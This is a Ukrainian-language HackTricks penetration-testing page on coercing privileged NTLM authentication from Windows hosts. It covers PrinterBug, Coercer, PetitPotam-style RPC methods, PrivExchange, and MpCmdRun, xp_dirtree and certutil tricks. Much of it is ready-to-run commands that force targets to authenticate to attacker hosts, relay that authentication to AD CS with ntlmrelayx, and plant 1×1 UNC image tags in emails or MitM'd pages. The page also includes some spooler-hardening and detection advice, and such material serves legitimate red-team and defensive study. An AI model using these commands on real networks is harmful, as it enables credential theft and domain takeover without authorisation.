# Примусова привілейована автентифікація NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) — це **колекція** **тригерів віддаленої автентифікації**, написаних на C# із використанням компілятора MIDL, щоб уникнути залежностей від сторонніх компонентів.

## Зловживання службою Spooler

Якщо службу _**Print Spooler**_ **увімкнено**, можна використати вже відомі облікові дані AD, щоб **запросити** в сервера друку контролера домену **оновлення** про нові завдання друку й просто вказати йому **надіслати сповіщення до певної системи**.\
Зауважте: коли принтер надсилає сповіщення довільним системам, йому потрібно **автентифікуватися на** цій **системі**. Тому зловмисник може змусити службу _**Print Spooler**_ автентифікуватися на довільній системі, і під час цієї автентифікації служба **використає обліковий запис комп’ютера**.

На низькому рівні класичний примітив **PrinterBug** зловживає **`RpcRemoteFindFirstPrinterChangeNotificationEx`** через **`\\PIPE\\spoolss`**. Спочатку зловмисник відкриває дескриптор принтера/сервера, а потім задає фальшиве ім’я клієнта в `pszLocalMachine`, щоб цільовий spooler створив канал сповіщень **до хоста, контрольованого зловмисником**. Саме тому йдеться про **примусову вихідну автентифікацію**, а не про пряме виконання коду.<sup>[[2]](#references)</sup>\
Якщо вас цікавить **RCE/LPE** безпосередньо у spooler, перегляньте [PrintNightmare](printnightmare.md). Ця сторінка присвячена **примусу до автентифікації та relay**.

### Пошук серверів Windows у домені

Скористайтеся PowerShell, щоб вивести список хостів Windows. Сервери зазвичай є цілями найвищого пріоритету, тож спершу зосередьтеся на них:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Виявлення служб Spooler, що прослуховують з’єднання

За допомогою трохи модифікованого [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) від @mysmartlogin (Vincent Le Toux) перевірте, чи прослуховує Spooler Service:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Також можна використовувати `rpcdump.py` у Linux і шукати протокол **MS-RPRN**:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

Або швидко перевірити хости з Linux за допомогою **NetExec/CrackMapExec**:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

Якщо ви хочете **перерахувати поверхні примусу**, а не просто перевірити, чи існує кінцева точка spooler, скористайтеся **режимом сканування Coercer**:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

Це корисно, оскільки наявність endpoint в EPM лише означає, що інтерфейс print RPC зареєстрований. Це **не** гарантує, що всі методи примусу до автентифікації доступні з вашими поточними привілеями або що хост запустить придатний для використання процес автентифікації.

### Попросіть службу автентифікуватися на довільному хості

Ви можете скомпілювати [SpoolSample з оригінального репозиторію](https://github.com/leechristensen/SpoolSample).

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

або використайте [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) або [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), якщо ви працюєте в Linux

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

За допомогою **Coercer** можна напряму націлюватися на інтерфейси spooler і не гадати, який метод RPC доступний:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### Сучасні callback-з’єднання RPC-over-TCP

Не припускайте, що успішний виклик `RpcRemoteFindFirstPrinterChangeNotificationEx` обов’язково спричинить трафік через TCP/445. **Windows 11 22H2 і новіші версії за замовчуванням використовують RPC over TCP для обміну даними під час друку**; RPC over named pipes вимкнено, якщо його не відновити за допомогою політики або `RpcUseNamedPipeProtocol=1`. Тому застарілі прослуховувачі, що працюють лише через SMB, можуть повідомити, що тригер надіслано, але так і не отримати callback. Microsoft описує TCP/135 (Endpoint Mapper) і динамічні порти RPC для звичайного RPC друку; організації можуть обмежити цей діапазон або вибрати фіксований порт RPC друку.<sup>[[10]](#references)</sup>

У поточній версії **Impacket `ntlmrelayx.py`** є RPC relay server і невеликий Endpoint Mapper, увімкнений за замовчуванням на TCP/135. Цю підтримку додали в червні 2025 року спеціально для продемонстрованого ланцюжка PrinterBug-to-AD-CS, що дає змогу виконати relay автентифікованого RPC callback, навіть якщо цільова система не переходить на SMB/WebDAV.<sup>[[11]](#references)</sup>

Підтримка RPC relay/EPM входить до **Impacket 0.13.0 і новіших версій**. Перш ніж з’ясовувати, чому не прослуховується TCP/135, перевірте, чи не запускається застаріла пакетна версія `ntlmrelayx.py`; у виводі довідки мають бути обидва перемикачі RPC-сервера.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

Шукайте `Setting up RPC Server on port 135` і `RPCD: Received connection` у виводі relay. Якщо RPC-виклик повертає очікувану помилку, але до listener нічого не надходить, перевірте політику RPC-транспорту друку на victim, фільтрацію вихідного трафіку, роздільну здатність DNS і чи не використовує інший процес TCP/135. Також переконайтеся, що `ntlmrelayx` запущено без параметра `--no-rpc-server`.

### Примусове використання HTTP замість SMB через WebClient

У системах, де досі використовується **RPC через іменовані канали** (застарілі збірки або поведінка, відновлена політикою), класичний PrinterBug зазвичай спричиняє автентифікацію **SMB** до `\\attacker\share`, що все ще корисно для **capture**, **relay до цілей HTTP** або **relay у випадках, коли SMB signing відсутній**.\
Однак relay **SMB до SMB** часто блокується через **SMB signing**, тому оператори можуть віддати перевагу примусовому використанню автентифікації **HTTP/WebDAV**. Це не запасний варіант для описаної вище поведінки RPC-over-TCP.

Якщо на цілі запущено службу **WebClient**, listener можна вказати у форматі, який змушує Windows використовувати **WebDAV через HTTP**:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

Це особливо корисно в поєднанні з **`ntlmrelayx --adcs`** або іншими HTTP relay-цілями, оскільки не потрібно покладатися на можливість SMB relay у примусово автентифікованому з’єднанні. Важливе застереження: для роботи варіанта через HTTP/WebDAV на комп’ютері-жертві має бути запущено **WebClient**.

### Поєднання з Unconstrained Delegation

Якщо зловмисник скомпрометував комп’ютер, налаштований для [Unconstrained Delegation](unconstrained-delegation.md), він може **примусити принтер автентифікуватися на цьому комп’ютері**. **TGT** облікового запису комп’ютера принтера кешується в пам’яті вузла з Unconstrained Delegation, звідки зловмисник може отримати його та повторно використати за допомогою [Pass the Ticket](pass-the-ticket.md).

### Примітки щодо виявлення та посилення захисту

Найнадійніший спосіб усунути PrinterBug на DC, PAW або сервері, який не друкує, — зупинити й вимкнути Spooler. Якщо друк потрібен, посильте захист усіх можливих цілей relay (увімкніть SMB server signing, LDAP signing/channel binding і EPA на HTTP-службах, таких як AD CS), а не покладайтеся на те, що блокування TCP/445 на шляху зворотного виклику буде достатнім.<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

Якщо хосту все ще потрібен **локальний друк**, можна застосувати вужче обмеження через GPO: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. Це забороняє spooler приймати віддалені клієнтські підключення (і спільний доступ до принтерів), але залишає службу доступною локально; після застосування перезапустіть spooler, а потім повторіть наведені вище перевірки доступності MS-RPRN.<sup>[[13]](#references)</sup>

Для виявлення слід зіставляти автентифікований виклик до MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, особливо opnum 62/65 із нелокальним значенням callback, із негайним вихідним SMB-, HTTP- або RPC-підключенням із хоста spooler. Створюйте базову лінію для **interface UUID/opnum і пар джерело/призначення**, а не лише для доступу до `\PIPE\spoolss`, оскільки в сучасних print stacks callback може працювати через RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## Примусова автентифікація RPC

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Матриця примусового UNC-path через RPC (інтерфейси/opnums, що запускають вихідну автентифікацію)
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Notes: асинхронний інтерфейс друку на тому самому spooler pipe; використовуйте Coercer для переліку доступних методів на заданому хості<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipes: \\PIPE\\efsrpc (також через \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Opnums, які часто зловживають: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Tool: CheeseOunce<sup>[[1]](#references)</sup>

Примітка: ці методи приймають параметри, що можуть містити UNC path (наприклад, `\\attacker\share`). Під час обробки Windows автентифікується до цього UNC у контексті комп’ютера або користувача, що дає змогу перехопити чи relay-нути NetNTLM.\
Для зловживання spooler **MS-RPRN opnum 65** залишається найпоширенішим і найкраще задокументованим примітивом, оскільки специфікація протоколу прямо зазначає, що сервер створює канал сповіщень до клієнта, указаного в `pszLocalMachine`.<sup>[[2]](#references)</sup>

### Примусова автентифікація через MS-EVEN: ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN через \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: ціль намагається відкрити вказаний шлях до резервної копії журналу та автентифікується до контрольованого зловмисником UNC.<sup>[[1]](#references)</sup>
- Practical use: примусити активи Tier 0 (DC/RODC/Citrix тощо) надсилати NetNTLM, а потім relay-нути його до кінцевих точок AD CS (сценарії ESC8/ESC11) або інших привілейованих служб.<sup>[[1]](#references)</sup>

## PrivExchange

Атака `PrivExchange` є наслідком вразливості у функції **Exchange Server `PushSubscription`**. Ця функція дає змогу будь-якому користувачу домену з поштовою скринькою змусити сервер Exchange автентифікуватися до будь-якого хоста, наданого клієнтом, через HTTP.

За замовчуванням **служба Exchange працює від імені SYSTEM** і має надмірні привілеї (зокрема, **WriteDacl privileges у домені до Cumulative Update 2019**). Цю вразливість можна використати, щоб **relay-нути дані до LDAP і згодом отримати доменну базу даних NTDS**. Якщо relay до LDAP неможливий, вразливість усе одно можна використати для relay-атак і автентифікації до інших хостів у домені. Успішна експлуатація цієї атаки надає негайний доступ до Domain Admin за допомогою будь-якого автентифікованого облікового запису користувача домену.

## Усередині Windows

Якщо ви вже маєте доступ до Windows-машини, можна змусити Windows підключитися до сервера з використанням привілейованих облікових записів за допомогою:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Або скористайтеся цією іншою технікою: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Можна використати lolbin certutil.exe (двійковий файл, підписаний Microsoft), щоб примусово ініціювати автентифікацію NTLM:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Через email

Якщо вам відома **адреса електронної пошти** користувача, який входить у систему на машині, яку ви хочете скомпрометувати, можна просто надіслати йому **email із зображенням розміром 1×1**, наприклад

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

Коли жертва відкриває його, Windows намагається пройти автентифікацію.

### MitM

Якщо ви можете виконати MitM-атаку й впровадити HTML у сторінку, яку переглядає жертва, спробуйте впровадити зображення, наприклад:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Інші способи примусити до автентифікації NTLM і виманити її


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Якщо ви можете перехопити [виклики NTLMv1, тут прочитайте, як їх зламати](../ntlm/index.html#ntlmv1-attack).\
_Пам’ятайте: щоб зламати NTLMv1, потрібно встановити challenge у Responder на "1122334455667788"_



## References

- [1] [Unit 42 – Примусова автентифікація продовжує еволюціонувати](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Протокол віддаленого керування журналом подій](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Оновлення RPC-з’єднання для друку у Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC relay server і Endpoint Mapper для ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 – випуск](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Політика CSP: дозволити Print Spooler приймати клієнтські підключення](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
